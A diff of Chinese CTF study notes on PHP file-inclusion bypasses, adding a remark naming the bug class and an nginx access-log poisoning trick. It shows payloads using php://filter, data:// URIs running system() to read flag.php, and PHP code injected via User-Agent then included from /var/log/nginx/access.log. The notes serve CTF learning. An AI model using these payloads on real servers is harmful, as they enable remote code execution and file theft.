@@ -157,7 +157,7 @@ c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
 c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
 ```
 
-**到这后，主要是发现 include($c)时的绕过办法**<br>
+**到这后，主要是发现 include($c)时的绕过办法，啊，正式名称叫做文件包含漏洞**<br>
 ```php
 //data:// 这是一个数据URI方案的一部分。数据URI方案允许将小片段的数据直接嵌入到网页中，而不需要外部资源的引用
 //text/plain: 这部分指定了数据的类型。在这个案例中，text/plain 表示数据是普通文本
@@ -169,7 +169,12 @@ c=data://text/plain,<?php system("tac fl*g.php")?>
 
 //<?php system('cat flag.php');
 ?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
+
+//nginx的默认访问日志目录,随后在http请求的User-Agent写入代码
+/?file=/var/log/nginx/access.log
+User-Agent: <?php system('tac fl0g.php'); ?>
 ```
+
 **还有通过`|`符号或来得到我们想要的可见字符：这个办法用来解决eval("echo($c);");**<br>
 ```python
 import re
